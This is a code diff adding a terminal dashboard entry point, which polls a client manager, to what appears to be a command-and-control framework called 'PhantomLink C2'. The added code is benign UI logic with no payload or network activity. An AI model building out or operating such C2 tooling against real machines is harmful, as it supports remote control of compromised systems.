@@ -205,3 +205,38 @@ def build_app(
     app = C2DashboardApp(data, refresh_interval)
     app.title = title
     return app
+
+
+# --- Thread entry point (called from C2.main) --------------------------------
+
+def start_dashboard(
+    client_manager: object,
+    port: int = 7000,
+    refresh_interval: float = 2.0,
+    title: str = "PhantomLink C2 - Live Dashboard",
+) -> None:
+    """Run the Textual dashboard. Intended to be started in a daemon thread
+    from ``C2.main()`` (which already does so on port 7000).
+
+    Contract:
+    * Never binds a socket and never touches the C2 command channel — the
+      TUI only polls the in-memory client snapshot, so the async UI loop
+      cannot block the TCP accept/command path.
+    * Degrades silently when there is no interactive terminal (tests, CI,
+      background runs) or Textual is unavailable.
+    * ``port`` is accepted for signature compatibility with the legacy
+      ``start_dashboard(client_manager, 7000)`` call site; it is reserved for
+      a future web view and is intentionally not bound here.
+    """
+    import sys
+
+    if not sys.stdin.isatty():
+        return  # headless / test environment: nothing to draw
+
+    data = DashboardData(client_manager, refresh_interval=refresh_interval)
+    try:
+        app = build_app(data, title=title, refresh_interval=refresh_interval)
+        app.run()
+    except Exception:
+        # TUI is best-effort; a dashboard crash must never kill the C2 shell.
+        return
